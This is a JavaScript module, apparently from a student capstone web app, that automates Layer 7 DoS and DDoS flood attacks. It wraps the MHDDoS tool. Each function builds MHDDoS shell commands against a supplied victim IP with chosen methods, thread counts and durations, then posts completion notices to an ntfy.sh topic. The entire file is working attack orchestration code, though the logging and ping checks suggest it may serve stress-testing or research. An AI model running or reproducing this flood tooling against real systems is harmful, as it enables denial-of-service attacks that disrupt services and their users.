const base = require('../attackbase')

const TOOLNAME = 'MHDDoS';
const TOOL_PERFORM = 'python /home/ubuntu/tools/attack/ddos/MHDDoS-2.4/start.py'

const METHOD_LAYER7_FLOOD = 'mhddos/mhddos-layer7-flood.json';
const METHOD_LAYER7_OTHER = 'mhddos/mhddos-layer7-other.json';


function notify(title,body) {
    fetch('https://ntfy.sh/gsp24ia08-capstone-webapp', {
        method: 'POST', // PUT works too
        body: body,
        headers: {
            'Title': title,
        }
    })
}





async function dosLayer7Flood(victimId, victimIP, duration, threads, initPing,sockType){
    console.log("---> Go to Dos Layer 7...");
    const attackList = await base.getAttackMethod(METHOD_LAYER7_FLOOD);

    const victimUrl = `http://${victimIP}/`;

    //Init writefile
    base.writeFile(victimId,TOOLNAME,attackList[0].Method,'Layer 7',"Flood", [],'dos');


    for (const attack of attackList) {
        const cmd = `${TOOL_PERFORM} ${attack.Agruments} ${victimUrl} ${sockType} ${threads} 0 101 ${duration}`;
        try {
            await base.dosLayer7(victimId, victimUrl, TOOLNAME, attack.Method, 'Layer 7', "Flood",cmd, duration, threads, initPing);
            notify(victimId, `${TOOLNAME} Layer 7 ${attack.Method} DoS DONE.`);
        } catch (error) {
            if (error.message === 'PingTimeout') {
                console.log('Ping timed out, skipping the attack.');
            } else {
                throw error;
            }
        }
    }
}

async function ddosLayer7Flood(victimId, victimIP, duration, threads, initPing,sockType){
    console.log("---> Go to DDos Layer 7...");
    const attackList = await base.getAttackMethod(METHOD_LAYER7_FLOOD);

    const victimUrl = `http://${victimIP}/`;

    //Init writefile
    base.writeFile(victimId,TOOLNAME,attackList[0].Method,'Layer 7',"Flood", [],'ddos');


    for (const attack of attackList) {
        const cmd = `${TOOL_PERFORM} ${attack.Agruments} ${victimUrl} ${sockType} ${threads} 0 101 ${duration}`;
        try {
            await base.ddosLayer7(victimId, victimUrl, TOOLNAME, attack.Method, 'Layer 7', "Flood",cmd, duration, threads, initPing);
            notify(victimId, `${TOOLNAME} Layer 7 ${attack.Method} DDoS DONE.`);
        } catch (error) {
            if (error.message === 'PingTimeout') {
                console.log('Ping timed out, skipping the attack.');
            } else {
                throw error;
            }
        }
    }
}

async function dosLayer7Other(victimId, victimIP, duration, threads, initPing,sockType){
    console.log("---> Go to Dos Layer 7...");
    const attackList = await base.getAttackMethod(METHOD_LAYER7_OTHER);

    const victimUrl = `http://${victimIP}/`;

    //Init writefile
    base.writeFile(victimId,TOOLNAME,attackList[0].Method,'Layer 7',"Other", [],'dos');


    for (const attack of attackList) {
        const cmd = `${TOOL_PERFORM} ${attack.Agruments} ${victimUrl} ${sockType} ${threads} 0 101 ${duration}`;
        try {
            await base.dosLayer7(victimId, victimUrl, TOOLNAME, attack.Method, 'Layer 7', "Other",cmd, duration, threads, initPing);
            notify(victimId, `${TOOLNAME} Layer 7 ${attack.Method} DoS DONE.`);
        } catch (error) {
            if (error.message === 'PingTimeout') {
                console.log('Ping timed out, skipping the attack.');
            } else {
                throw error;
            }
        }
    }
}

async function ddosLayer7Other(victimId, victimIP, duration, threads, initPing,sockType){
    console.log("---> Go to DDos Layer 7...");
    const attackList = await base.getAttackMethod(METHOD_LAYER7_OTHER);

    const victimUrl = `http://${victimIP}/`;

    //Init writefile
    base.writeFile(victimId,TOOLNAME,attackList[0].Method,'Layer 7',"Other", [],'ddos');


    for (const attack of attackList) {
        const cmd = `${TOOL_PERFORM} ${attack.Agruments} ${victimUrl} ${sockType} ${threads} 0 101 ${duration}`;
        try {
            await base.ddosLayer7(victimId, victimUrl, TOOLNAME, attack.Method, 'Layer 7', "Other",cmd, duration, threads, initPing);
            notify(victimId, `${TOOLNAME} Layer 7 ${attack.Method} DDoS DONE.`);
        } catch (error) {
            if (error.message === 'PingTimeout') {
                console.log('Ping timed out, skipping the attack.');
            } else {
                throw error;
            }
        }
    }
}





module.exports = {
    dosLayer7Flood,
    ddosLayer7Flood,

    dosLayer7Other,
    ddosLayer7Other
}

